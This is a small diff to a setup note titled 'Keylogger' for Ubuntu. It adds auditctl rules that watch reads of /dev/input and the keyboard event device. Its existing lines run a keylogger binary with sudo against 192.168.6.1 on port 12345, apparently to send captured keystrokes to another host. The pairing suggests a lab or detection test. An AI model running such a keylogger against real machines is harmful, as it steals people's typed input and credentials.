@@ -1,6 +1,10 @@
 Keylogger
 
 (Ubuntu)
+sudo auditctl -w /dev/input -p r -k keylogger_input
+sudo auditctl -w /dev/input/by-path/platform-i8042-serio-0-event-kbd -p r -k keylogger_keyboard
+then start.sh
+
 cd keylogger
 sudo ./keylogger 192.168.6.1 12345
 
